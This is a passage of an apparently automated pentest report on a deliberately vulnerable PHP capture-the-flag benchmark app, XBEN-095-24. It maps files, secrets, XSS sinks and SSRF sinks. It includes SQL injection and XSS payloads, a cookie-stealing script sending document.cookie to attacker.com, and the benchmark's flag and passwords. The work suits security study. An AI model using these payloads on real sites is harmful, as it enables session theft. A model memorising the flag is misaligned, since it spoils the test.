The XBEN-095-24 codebase follows a flat, minimalist structure optimized for rapid security assessment rather than production scalability, organized into three primary directories with clear separation between application code, database initialization, and configuration. The project root (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/`) contains orchestration files (`docker-compose.yml`, `.env`) that define the two-service architecture and inject secrets into containers, while `benchmark.json` provides metadata indicating this is a "beginner" difficulty CTF challenge with a win condition of capturing the FLAG value.

The `app/` directory houses all PHP application code—three files totaling 116 lines without any subdirectory structure, MVC pattern, or code organization beyond functional separation (index for navigation, login for authentication, search for querying). The `Dockerfile` within `app/` uses a multi-stage pattern to copy source files, install the mysqli extension via `docker-php-ext-install`, and bake the FLAG into the container environment through build arguments, creating immutable infrastructure where secrets cannot be externally rotated post-deployment. Notably absent are any dependency manifests (`composer.json`), framework scaffolding (Laravel's `artisan`, Symfony's `bin/`), testing frameworks (PHPUnit directories), or asset pipelines (Webpack, Gulp configs), reinforcing that this is a from-scratch implementation without modern PHP ecosystem tooling.

The `mysql/` directory contains database bootstrapping artifacts: a `Dockerfile` that sets the root password to the dictionary word "password" and a `init.sql` script executed automatically by the MySQL Docker image's entrypoint mechanism, which creates the database schema, seeds the single admin user with plaintext password, and grants minimal SELECT-only privileges to the application user—representing the codebase's sole security-conscious design decision. The lack of migration frameworks (Flyway, Liquibase), version-controlled schema evolution, or seed data separation means database changes require destructive container rebuilds rather than incremental migrations.

From a security discoverability perspective, this flat structure paradoxically aids threat modeling—all attack surfaces are immediately visible without traversing nested route definitions, controller hierarchies, or middleware pipelines. However, it also highlights the absence of defense-in-depth architectural patterns: no `middleware/` directory for security filters, no `validators/` directory for input sanitization libraries, no `services/` layer to separate business logic from database access, and critically, no `security/` or `auth/` modules implementing reusable authentication, CSRF protection, or session management utilities. The codebase uses no build orchestration (Make, Gradle, npm scripts beyond Docker Compose), no code generation tools, and no testing frameworks, making it trivial to audit but representative of early-2000s PHP development practices rather than modern secure coding standards. The `.env` file's presence in version control (typically ignored via `.gitignore`) immediately exposes the FLAG and database credentials to anyone with repository access, indicating intentional vulnerability rather than production negligence.

---

## 8. Critical File Paths

### Configuration
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/docker-compose.yml` - Container orchestration, database credentials, FLAG build argument
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/.env` - FLAG value (`flag{787d5a7f-ec79-4620-99c5-17c50dced80a}`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/Dockerfile` - Web application container build, FLAG environment variable
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/mysql/Dockerfile` - Database container build, root password
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/benchmark.json` - CTF metadata (difficulty, win condition)

### Authentication & Authorization
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/login.php` - Authentication endpoint (lines 23-47: POST handler, line 28: prepared statement, lines 36/43/46: response messages, line 8: FLAG retrieval)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/index.php` - Session initialization (line 1: `session_start()`)

### API & Routing
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/index.php` - Landing page (9 lines, minimal attack surface)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/login.php` - Login form (lines 48-62: GET handler) and authentication (lines 23-47: POST handler)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/search.php` - User search endpoint (lines 24-38: request handler, line 25: SQL injection vulnerability, line 30: XSS vulnerability)

### Data Models & DB Interaction
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/mysql/init.sql` - Database schema (lines 8-11: users table), seed data (line 13: admin credentials `admin:ThisIsBestPassword`), user permissions (line 15: SELECT-only grant)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/login.php` - Database connection (lines 6-11: mysqli_connect with environment variables), prepared statement usage (lines 28-31)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/search.php` - Database connection (lines 6-11), vulnerable SQL query (line 25: string concatenation), result display (line 30)

### Dependency Manifests
- **NONE** - No `composer.json`, `package.json`, `requirements.txt`, or dependency management files exist

### Sensitive Data & Secrets Handling
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/.env` - FLAG value in plaintext (line 1)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/docker-compose.yml` - Database credentials (lines 19-21: `MYSQL_USER`, `MYSQL_PASSWORD`, `MYSQL_DATABASE`), health check with password in command (line 10)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/mysql/init.sql` - Database password (lines 2, 15: `MyPass1234`), admin password (line 13: `ThisIsBestPassword`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/mysql/Dockerfile` - Root password (line 3: `MYSQL_ROOT_PASSWORD=password`)

### Middleware & Input Validation
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/login.php` - Ineffective filter (lines 17-19: returns input unchanged)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/search.php` - Bypassable filter (lines 15-22: blocks whitespace and SQL keywords)

### Logging & Monitoring
- **NONE** - No custom logging implementation, relies on Apache default access logs (not persisted)

### Infrastructure & Deployment
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/docker-compose.yml` - Service orchestration (lines 4-10: db service, lines 12-23: web service), port mapping (line 17: `8080:80`), health checks (line 9-10)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/Dockerfile` - PHP/Apache container (line 1: base image `php:7.4-apache`, line 3: mysqli installation, lines 9-10: FLAG environment variable, line 11: file permissions)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/mysql/Dockerfile` - MySQL container (line 1: base image `mysql:5.7.15`, line 3: root password, line 4: init script copy)

### CTF Flag Storage
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/.env` - FLAG value in plaintext: `FLAG="flag{787d5a7f-ec79-4620-99c5-17c50dced80a}"`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/docker-compose.yml` - FLAG passed as build argument (line 15: `- FLAG`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/Dockerfile` - FLAG stored in container environment (lines 9-10: `ARG FLAG` → `ENV FLAG=$FLAG`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/login.php` - FLAG disclosed on successful authentication (line 36: `echo 'Congratz, flag is ' . $flag;`)

---

## 9. XSS Sinks and Render Contexts

The XBEN-095-24 application has a **limited XSS attack surface** due to its minimal codebase and lack of client-side JavaScript. Only **one XSS sink** exists in network-accessible components, located within the search functionality. No XSS sinks were found in JavaScript context, CSS context, URL context, or HTML attribute context as the application uses static HTML forms without dynamic attribute generation or inline event handlers.

### HTML Body Context Sinks

**XSS SINK #1: Reflected Output in Search Results**

- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/search.php`
- **Line Number:** 30
- **Code Snippet:**
  ```php
  while($row = $result->fetch_assoc()) {
      echo "User exists: " . $row["username"] .'<br/>';
  }
  ```

- **Render Context:** HTML Body (direct concatenation into HTML output without encoding)
- **Input Source:** Database (`users.username` column) ← Indirectly from `$_REQUEST["username"]` parameter via SQL query at line 25
- **Current Sanitization:** **NONE** - No `htmlspecialchars()`, `htmlentities()`, or Content Security Policy
- **Exploitation Potential:** **HIGH**

**Attack Chain Analysis:**

This is a **stored/reflected hybrid XSS vulnerability** requiring chaining with the SQL injection vulnerability at line 25. The attack sequence is:

1. **Stage 1: SQL Injection** - Exploit `search.php:25` to insert malicious username into database
   ```bash
   # Inject XSS payload as username (requires bypassing SELECT-only privilege via stacked queries if DB allows, or via other write vector)
   curl -X POST http://localhost:8080/search.php \
     -d 'username=admin"union/**/select/**/<script>alert(document.domain)</script>,2,3#'
   ```

2. **Stage 2: Trigger XSS** - When any user searches for that username, the payload executes:
   ```bash
   curl -X POST http://localhost:8080/search.php -d 'username=<script>alert(document.domain)</script>'
   ```
   The database returns `<script>alert(document.domain)</script>` which is echoed directly without encoding, executing in the victim's browser.

**Proof of Concept:**

If the database contains a user with username `<img src=x onerror=alert('XSS')>`, searching for that username results in:
```html
User exists: <img src=x onerror=alert('XSS')><br/>
```
The browser parses this as an HTML `<img>` tag, triggers the `onerror` event due to the invalid `src`, and executes the JavaScript payload.

**Session Cookie Theft Scenario:**

Given that `session.cookie_httponly = 0` (Section 3), an XSS payload can steal session cookies:
```html
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
```
If this payload is stored in the database and reflected via the search function, it exfiltrates `PHPSESSID` cookies to the attacker's server.

**Limitations:**

The `appuser` database account has **SELECT-only** privileges (verified in Section 4), preventing direct insertion of malicious usernames via SQL injection. However, XSS is still exploitable if:
1. An administrator manually inserts a malicious username via direct database access
2. The database is compromised through another vector (e.g., MySQL root account with password `password`)
3. Future functionality adds user registration that doesn't sanitize usernames
4. An attacker finds a privilege escalation path in MySQL (version 5.7.15 has known CVEs)

**Output Location:** `Content-Type: text/html; charset=UTF-8` response body, rendered as HTML by the browser.

### HTML Attribute Context Sinks

**NONE FOUND.** The application uses static HTML forms without dynamic attribute generation. All form elements have hardcoded attributes:
```html
<form action="login.php" method="POST">
    <input type="text" name="username" required>
    <input type="password" name="password" required>
    <button type="submit">Login</button>
</form>
```
No user input is placed into `href`, `src`, `onclick`, `style`, or other HTML attributes.

### JavaScript Context Sinks

**NONE FOUND.** The application contains **no JavaScript code** whatsoever. Searched all files for `<script>` tags and JavaScript-related patterns:
```bash
grep -r "<script\|eval\|setTimeout\|setInterval\|Function(" app/*.php
# No matches (only in this documentation's examples)
```
There are no `.js` files, no inline JavaScript, and no dynamic script generation. The application is pure server-side PHP with static HTML forms.

### CSS Context Sinks

**NONE FOUND.** The application contains **no CSS styling** beyond basic HTML. No `<style>` tags, no CSS files, and no dynamic style generation. Searched for CSS-related patterns:
```bash
grep -r "<style\|\.style\|CSSStyleDeclaration" app/*.php
# No matches
```
No user input is placed into CSS contexts.

### URL Context Sinks

**NONE FOUND.** The application does not manipulate `window.location`, `location.href`, or use `history.pushState/replaceState`. All navigation is via static HTML hyperlinks:
```php
// index.php lines 7-8
<a href="/search.php">Search users</a><br>
<a href="/login.php">Login</a><br>
```
No URL redirection based on user input exists. Searched for URL manipulation patterns:
```bash
grep -r "location\|window\.location\|history\." app/*.php
# No matches
```

### Summary of XSS Findings

| Sink Type | Count | Locations | Severity |
|-----------|-------|-----------|----------|
| HTML Body Context | 1 | `search.php:30` | High (requires SQL injection chain) |
| HTML Attribute Context | 0 | N/A | N/A |
| JavaScript Context | 0 | N/A | N/A |
| CSS Context | 0 | N/A | N/A |
| URL Context | 0 | N/A | N/A |

**Total XSS Sinks:** 1 (requires chaining with SQL injection due to SELECT-only database privileges)

---

## 10. SSRF Sinks

After comprehensive analysis of all network-accessible components, **no SSRF (Server-Side Request Forgery) sinks were found in the XBEN-095-24 application.** The application is a self-contained PHP web application that performs no outbound HTTP requests, URL fetching, external file loading, or server-side network operations.

### Scope of Analysis

Analyzed all three network-accessible PHP endpoints:
1. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/index.php` (9 lines)
2. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/login.php` (64 lines)
3. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/search.php` (45 lines)

### Exhaustive SSRF Sink Search Results

**HTTP(S) Clients:** NONE
- Searched for: `file_get_contents`, `fopen`, `curl_init`, `curl_exec`, `curl_setopt`, `stream_context_create`
- **Result:** No HTTP client usage found
- **Verification:** The only PHP extension installed is `mysqli` (per `app/Dockerfile:3`). The `curl` extension is not installed, and no `file_get_contents()` calls with URLs exist.

**Raw Sockets & Connect APIs:** NONE
- Searched for: `fsockopen`, `pfsockopen`, `stream_socket_client`, `socket_connect`
- **Result:** No socket operations found
- **Verification:** All network communication is limited to the internal MySQL connection via `mysqli_connect()` at lines 6-11 in `login.php` and `search.php`, which connects to the Docker-internal `db` service, not user-controllable destinations.

**URL Openers & File Includes:** NONE
- Searched for: `readfile`, `file()`, `copy()`, `include`, `require`, `include_once`, `require_once`
- **Result:** No file inclusion or URL loading found
- **Verification:** The only `include`/`require` statements would be for local PHP files, but the application is so minimal that no includes exist at all—each PHP file is self-contained.

**Redirect & Location Handlers:** NONE
- Searched for: `header('Location:`, `response.redirect`, `http_redirect`
- **Result:** No redirect functionality found
- **Verification:** The application has no URL redirection logic. All responses either display HTML directly or echo results inline without HTTP redirect headers.

**Headless Browsers & Render Engines:** NONE
- Searched for: Puppeteer, Playwright, Selenium, wkhtmltopdf, phantomjs
- **Result:** No headless browser or PDF generation libraries
- **Verification:** The application is pure PHP with no Node.js dependencies (no `package.json`) and no PDF generation capabilities.

**Media Processors:** NONE
- Searched for: `imagecreatefromjpeg`, `imagecreatefrompng`, `getimagesize`, `exif_read_data`, ImageMagick, GraphicsMagick, FFmpeg
- **Result:** No image processing or media handling
- **Verification:** The application has no file upload functionality (Section 5), no image processing, and no media-related PHP extensions installed.

**Link Preview & Unfurlers:** NONE
- **Result:** No link preview, oEmbed, or URL metadata extraction functionality
- **Verification:** The application has no features that would require fetching external URL metadata.

**Webhook Testers & Callback Verifiers:** NONE
- **Result:** No webhook testing, callback verification, or health check notification features
- **Verification:** The application is entirely synchronous with no outbound notifications or webhooks.

**SSO/OIDC Discovery & JWKS Fetchers:** NONE
- **Result:** No OAuth, OpenID Connect, or JWKS fetching (confirmed in Section 3)
- **Verification:** Authentication is entirely local using the MySQL database.

**Importers & Data Loaders:** NONE
- **Result:** No "import from URL" functionality, no RSS/Atom readers, no remote data synchronization
- **Verification:** The application has only local database queries with no external data import features.

**Package/Plugin/Theme Installers:** NONE
- **Result:** No plugin system, no theme system, no package installation features
- **Verification:** The application is a fixed codebase with no dynamic extension loading.

**Monitoring & Health Check Frameworks:** NONE
- **Result:** No URL pingers, uptime checkers, or monitoring probes in the application code
- **Verification:** The Docker Compose configuration has a database health check (`docker-compose.yml:9-10`), but this is **infrastructure-level** (runs `mysqladmin ping` in the database container), not an application-level feature accessible via the web interface.

**Cloud Metadata Helpers:** NONE
- **Result:** No AWS/GCP/Azure metadata calls, no cloud service discovery
- **Verification:** The application runs in Docker without cloud provider integration.

### Database Connection (Not SSRF)

The only external network connection is the MySQL database connection in `login.php:6-11` and `search.php:6-11`:
```php
$conn = mysqli_connect(
    getenv('MYSQL_HOST'),    // "db" (Docker service name)
    getenv('MYSQL_USER'),    // "appuser"
    getenv('MYSQL_PASSWORD'),// "MyPass1234"
    getenv('MYSQL_DATABASE') // "appdb"
);
```

**SSRF Analysis:** This is **NOT an SSRF sink** because:
1. The `MYSQL_HOST` value is hardcoded in `docker-compose.yml:19` as the string literal `"db"` (Docker service name)
2. No user input influences the connection parameters
3. The environment variables are set at container build/runtime, not from HTTP request parameters
4. The MySQL port (3306) is not exposed externally (Section 5), limiting blast radius even if this were exploitable

### Conclusion

**No SSRF sinks exist in network-accessible components.** The application's attack surface is limited to:
1. SQL injection (Section 9, `search.php:25`)
2. XSS (Section 9, `search.php:30`)
3. Authentication vulnerabilities (Section 3)
4. Session security issues (Section 3)

There are no pathways for an external attacker to force the server to make requests to arbitrary internal or external destinations.